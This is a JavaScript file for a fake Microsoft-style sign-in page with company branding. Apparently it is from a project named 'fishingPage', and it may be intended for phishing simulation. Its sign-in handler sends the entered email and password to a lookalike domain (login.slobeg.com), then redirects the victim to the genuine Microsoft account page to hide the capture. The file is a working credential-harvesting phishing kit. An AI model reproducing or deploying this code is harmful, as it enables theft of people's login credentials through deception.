const inputEmail = document.getElementById('input-email');
let inputEmailValue = '';

const enteredEmail = document.getElementById('entered-email');
const inputPassword = document.getElementById('input-password');
const errorMessage = document.getElementById('error-message');
const logoSmall = document.getElementById('logo-small');
const lowerBlock = document.querySelector('.lower-block');

const noAccount = document.querySelector('.no-account');
const cantAccess = document.querySelector('.cant-access');
const bodyElement = document.body;
const footer = document.querySelector('footer');
const footerElements = footer.querySelectorAll('*');

const signInOptionMenu = document.querySelector('.sing-in-options-menu');
const signInOptionMenuChild = signInOptionMenu.querySelectorAll('*');
const forgotPass = document.querySelector('.forgot-pass');
const signInButton = document.querySelector('.sign-in');
const backButton = document.querySelector('.back');
const signInOptionTitle = document.getElementById('sing-options-title');
const signInTitle = document.getElementById('sign-in-title');
const passwordTitle = document.getElementById('enter-pass-title');
const enteredEmailText = document.getElementById('enter-message');
const nextButton = document.getElementById('next-button');
const sigInOptionsTitle = document.getElementById('sign-in-options-title');

function validateInput() {


  // Validate email input
  // if (!inputEmailValue || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputEmailValue)) {
  //   errorMessage.style.display = 'block';
  //   inputEmail.style.borderBottomColor = 'red';
  // }
  // else
  {
    errorMessage.style.display = 'none';
    inputEmail.style.borderBottomColor = 'black';

    signInTitle.style.display = 'none';
    enteredEmail.style.display = 'flex';
    inputEmail.style.display = 'none';

    inputPassword.style.display = 'block';
    passwordTitle.style.display = 'block';

    forgotPass.style.display = 'block';
    nextButton.style.display = 'none';

    bodyElement.style.backgroundImage = `linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('../public/assets/images/solbeg_logo.png')`;

    logoSmall.src = '../public/assets/images/solbeglogo_rect.png';
    lowerBlock.style.display = 'none';

    footerElements.forEach(element => {
      element.style.color = 'white';
    });

    noAccount.style.display = 'none';
    cantAccess.style.display = 'none';
    signInButton.style.display = 'block';
    inputEmailValue = inputEmail.value;
    enteredEmailText.textContent = inputEmailValue;
  }
}

function backToFirstBlock() {

  logoSmall.src = '../public/assets/images/logo_rect.svg';
  signInTitle.style.display = 'block';
  passwordTitle.style.display = 'none';
  inputEmail.style.display = 'block';
  inputPassword.style.display = 'none';
  noAccount.style.display = 'block';
  cantAccess.style.display = 'block';
  nextButton.style.display = 'block';
  signInButton.style.display = 'none';
  forgotPass.style.display = 'none';
  lowerBlock.style.display = 'flex';
  enteredEmail.style.display = 'none';

  signInOptionMenu.style.display = 'none';
  sigInOptionsTitle.style.display = 'none';
  backButton.style.display = 'none';

  bodyElement.style.backgroundImage = `url('../public/assets/images/background.svg')`;

  footerElements.forEach(element => {
    element.style.color = 'black';
  });
}
function openLoverBlock(){
  sigInOptionsTitle.style.display = 'block';
  signInOptionMenu.style.display = 'flex';
  signInOptionMenu.style.flexDirection = 'column';
  inputEmail.style.display = 'none';
  signInTitle.style.display = 'none';
  noAccount.style.display = 'none';
  cantAccess.style.display = 'none';
  nextButton.style.display = 'none';
  backButton.style.display = 'block';
  signInButton.style.display = 'none';
  forgotPass.style.display = 'none';
  lowerBlock.style.display = 'none';
  enteredEmail.style.display = 'none';

}
document.addEventListener('DOMContentLoaded', () => {
  const nextButton = document.getElementById('next-button');
  nextButton.addEventListener('click', () => {
    validateInput();
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const arrowButton = document.getElementById('arrow');
  arrowButton.addEventListener('click', () => {
    backToFirstBlock();
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const backButton = document.querySelector('.back');
  backButton.addEventListener('click', () => {
    backToFirstBlock();
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const lowerBlockButton = document.querySelector('.lower-block');
  lowerBlockButton.addEventListener('click', () => {
    openLoverBlock();
  });
});

document.addEventListener('DOMContentLoaded', () => {
  const signInButton = document.querySelector('.sign-in');
  signInButton.addEventListener('click', () => {
    //const url = "http://localhost:8080/fishingPage_war_exploded/api/user/signup";

    const inputEmail = document.getElementById('input-email');
    const inputEmailValue = inputEmail.value;

    const inputPassword = document.getElementById('input-password');
    const inputPasswordValue = inputPassword.value;

    const data = {
      login: inputEmailValue,
      password: inputPasswordValue
    };

    fetch('https://login.slobeg.com/api/user/signup', {
      method: 'POST',
      mode: 'no-cors', // Режим без CORS
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        login: inputEmailValue,
        password: inputPasswordValue
      })
    })
      .then(() => {
        console.log('Запрос отправлен, но ответ недоступен из-за режима no-cors');
        window.location.href = 'https://myaccount.microsoft.com';
      })
      .catch(error => {
        console.error('Ошибка:', error);
      });

  });
});

document.addEventListener('DOMContentLoaded', () => {
  const elements = [
    document.getElementById('next-button'),
    document.getElementById('input-email'),
    document.getElementById('sign-in-title'),
    document.querySelector('.no-account'),
    document.querySelector('.cant-access'),
    document.querySelector('.sign-in'),
    document.querySelector('.button')
  ];

  elements.forEach(el => {
    if (el) {
      el.classList.add('animate-slide-in');
    }
  });
});
